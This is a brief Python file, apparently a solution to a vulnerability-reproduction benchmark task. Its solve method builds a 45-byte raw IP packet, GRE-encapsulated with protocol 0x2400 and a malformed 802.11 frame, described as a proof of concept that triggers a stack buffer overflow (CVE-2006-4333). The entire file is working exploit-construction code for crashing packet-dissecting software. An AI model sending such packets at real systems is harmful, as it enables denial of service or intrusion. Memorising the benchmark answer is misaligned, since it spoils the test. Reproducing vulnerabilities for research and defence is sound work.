import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the Stack Buffer Overflow vulnerability (CVE-2006-4333).
        The vulnerability occurs when an 802.11 packet is encapsulated in GRE with protocol 0x2400.
        The PoC is a raw IP packet of 45 bytes.
        """
        
        # --- IP Header (20 bytes) ---
        version_ihl = 0x45  # Version 4, Header Length 5 (20 bytes)
        tos = 0
        total_length = 45   # IP(20) + GRE(4) + Payload(21)
        ip_id = 0x1337
        flags_frag = 0
        ttl = 64
        protocol = 47       # GRE
        checksum = 0
        src_ip = b'\x7f\x00\x00\x01'
        dst_ip = b'\x7f\x00\x00\x01'

        # Pack header with 0 checksum
        ip_header_fmt = '!BBHHHBBH4s4s'
        header_data = struct.pack(ip_header_fmt, version_ihl, tos, total_length, 
                                  ip_id, flags_frag, ttl, protocol, checksum, src_ip, dst_ip)

        # Calculate IP Checksum
        s = 0
        for i in range(0, len(header_data), 2):
            w = (header_data[i] << 8) + header_data[i+1]
            s += w
        s = (s >> 16) + (s & 0xFFFF)
        s += (s >> 16)
        checksum = ~s & 0xFFFF

        # Repack with correct checksum
        ip_header = struct.pack(ip_header_fmt, version_ihl, tos, total_length, 
                                ip_id, flags_frag, ttl, protocol, checksum, src_ip, dst_ip)

        # --- GRE Header (4 bytes) ---
        # Flags/Version: 0x0000 (No flags, Version 0)
        # Protocol: 0x2400 (Maps to IEEE 802.11 in the vulnerable configuration)
        gre_header = struct.pack('!HH', 0x0000, 0x2400)

        # --- Payload (21 bytes) ---
        # Malformed 802.11 frame (e.g., Beacon frame start) to trigger dissection
        # 45 (Total) - 20 (IP) - 4 (GRE) = 21 bytes remaining
        payload = b'\x80\x00' + b'\x00' * 19

        return ip_header + gre_header + payload
